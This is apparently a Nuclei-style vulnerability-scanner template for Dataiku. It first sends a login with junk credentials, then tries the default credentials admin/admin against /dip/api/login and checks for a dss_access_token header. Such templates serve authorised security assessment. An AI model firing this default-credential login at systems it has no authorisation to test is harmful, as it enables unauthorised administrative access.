id: poc-yaml-dataiku-weak-password-login

info:
  name: Dataiku Weak Password Login
  author: ProjectDiscoveryAI
  severity: high
  tags: weak-password, login, dataiku

http:
  - raw:
      - |
        POST /dip/api/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        login=asdadw&password=asdawdad
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 401
      - type: word
        words:
          - "Authentication failed."
        part: body

  - raw:
      - |
        POST /dip/api/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        login=admin&password=admin
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "dss_access_token"
        part: header
      - type: word
        words:
          - ""
        part: body
